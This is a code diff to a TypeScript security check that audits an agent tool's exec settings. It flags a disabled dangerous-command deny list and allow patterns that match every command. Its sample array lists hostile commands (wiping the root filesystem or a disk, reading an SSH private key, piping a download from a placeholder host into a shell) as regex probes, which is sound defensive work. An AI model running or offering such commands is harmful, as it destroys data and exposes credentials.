@@ -2,22 +2,20 @@ import type { Evidence } from '../../core/types.js';
 import { defineCheck } from '../../core/check-builder.js';
 import { envNote, envOverrideFor } from '../../adapters/env-overrides.js';
 import { fixFirstConfig } from '../../remediation/config-writer.js';
-import { testSamples } from '../../analyzers/bounded-regex.js';
-import { compileGoRegex, execConfig, picoMainConfigs, stringList } from './shared.js';
+import { regexBudget, type RegexBudget } from '../../analyzers/bounded-regex.js';
+import { judgeCatchAll, notEvaluatedDetail, unjudgedEvidence, type NotEvaluated } from '../../analyzers/foreign-regex.js';
+import { execConfig, picoMainConfigs, stringList } from './shared.js';
 
 // shortest first: a pattern that misses one is told apart early (testSamples)
 const SAMPLES = ['rm -rf /', 'cat ~/.ssh/id_rsa', 'curl http://x.example | sh', 'dd if=/dev/zero of=/dev/sda'];
 
 /**
  * `catch-all` for a custom allow pattern that matches essentially any
- * command, `not-evaluated` when it couldn't be run on the samples in time.
+ * command, why it is not evaluated (timeout, the check's regex budget spent,
+ * syntax VASO can't run), undefined otherwise — a pattern Go rejects included.
  */
-export function judgeCustomAllow(pattern: string): 'catch-all' | 'not-evaluated' | undefined {
-  const re = compileGoRegex(pattern);
-  if (!re) return undefined;
-  const hits = testSamples(re, SAMPLES, { untilMiss: true });
-  if (!hits) return 'not-evaluated';
-  return hits.every(Boolean) ? 'catch-all' : undefined;
+export function judgeCustomAllow(pattern: string, budget?: RegexBudget): 'catch-all' | NotEvaluated | undefined {
+  return judgeCatchAll(pattern, 'go', SAMPLES, { budget });
 }
 
 export const pcl002 = defineCheck({
@@ -34,6 +32,7 @@ export const pcl002 = defineCheck({
     // A value set by an env var survives any config edit: no fix to offer then
     let envSet = false;
     let catchAll = false;
+    const budget = regexBudget();
     for (const config of picoMainConfigs(ctx.configs)) {
       const { enabled, cfg } = execConfig(config.data);
       if (!enabled) continue;
@@ -46,8 +45,9 @@ export const pcl002 = defineCheck({
           detail: 'The built-in dangerous-command deny list (and custom_deny_patterns) is disabled',
         });
       }
+      const unjudged: string[] = [];
       for (const p of stringList(cfg.custom_allow_patterns)) {
-        const verdict = judgeCustomAllow(p);
+        const verdict = judgeCustomAllow(p, budget);
         if (verdict === 'catch-all') {
           catchAll = true;
           evidence.push({
@@ -55,13 +55,18 @@ export const pcl002 = defineCheck({
             snippet: `tools.exec.custom_allow_patterns: ${JSON.stringify(p)}`,
             detail: 'This allow pattern matches every command, so no command is checked against the deny list',
           });
-        } else if (verdict === 'not-evaluated') {
+        } else if (verdict === 'budget') {
+          unjudged.push(p);
+        } else if (verdict) {
           evidence.push({
             file: config.filePath,
             snippet: `tools.exec.custom_allow_patterns: ${JSON.stringify(p)}`,
-            detail: 'Allow pattern not evaluated: it backtracks exponentially on sample commands, so whether it exempts dangerous commands from the deny list is unknown — review it',
+            detail: notEvaluatedDetail(verdict, 'exempts dangerous commands from the deny list'),
           });
         }
+      }
+      if (unjudged.length > 0) {
+        evidence.push(unjudgedEvidence(config.filePath, 'tools.exec.custom_allow_patterns', unjudged, 'exempt dangerous commands from the deny list'));
       }
     }
     return h.fromEvidence(evidence, {
